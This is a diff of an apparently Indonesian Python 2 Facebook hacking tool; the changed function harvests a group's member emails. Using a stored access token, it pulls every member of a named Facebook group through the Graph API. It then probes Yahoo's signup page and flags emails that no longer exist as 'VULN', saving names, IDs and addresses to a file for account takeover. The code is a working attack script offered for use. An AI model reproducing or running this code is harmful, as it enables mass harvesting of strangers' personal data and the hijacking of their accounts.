@@ -989,7 +989,7 @@ def pilih():
         elif unikers =="6":
 		test()
         elif unikers =="7":
-		yahoomember()
+		clone_dari_member_group()
         elif unikers =="8":
 		os.system('clear')
 		print logo
@@ -2976,39 +2976,40 @@ def pilih_super():
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
 
-def yahoomember():
+def clone_dari_member_group():
 	global toket
-	os.system('reset')
+	os.system('clear')
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		keluar()
 	try:
 		os.mkdir('out')
 	except OSError:
 		pass
-	os.system('reset')
+	os.system('clear')
 	print logo
 	mpsh = []
 	jml = 0
-	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+	print 42*"\033[1;96m●"
+	id=raw_input('\033[1;96m[+] \033[1;93mClone  ID group \033[1;91m:\033[1;97m ')
 	try:
 		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
 		asw=json.loads(r.text)
-		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
 	except KeyError:
-		print"\033[1;91m[!] Group not found"
-		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		menu_yahoo()
-	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
+		print"\033[1;96m[!] \x1b[1;91mGroup not found"
+		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+		menu()
+	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
 	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
 	kimak = json.loads(teman.text)
-	save = open('out/GrupMailVuln.txt','w')
-	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
-	print 42*"\033[1;97m═"
+	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print 42*"\033[1;96m="
 	for w in kimak['data']:
 		jml +=1
 		mpsh.append(jml)
@@ -3032,20 +3033,23 @@ def yahoomember():
 				except:
 					continue
 				if '"messages.ERROR_INVALID_USERNAME">' in pek:
-					save.write(mail + '\n')
-					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
+					print("\033[1;96m[✓] \033[1;92mVULN")
+					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
+					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
+					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
+					save = open('out/GrupMailVuln.txt','a')
+					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
+					save.close()
 					berhasil.append(mail)
 		except KeyError:
 			pass
-	print 42*"\033[1;97m═"
-	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
-	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
-	save.close()
-	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-	menu_yahoo()
-		
-		
+	print 42*"\033[1;96m="
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
+	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;96m[+] \033[1;92mFile lovehacker\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	menu()
+			
 def brute():
     os.system('clear')
     try:
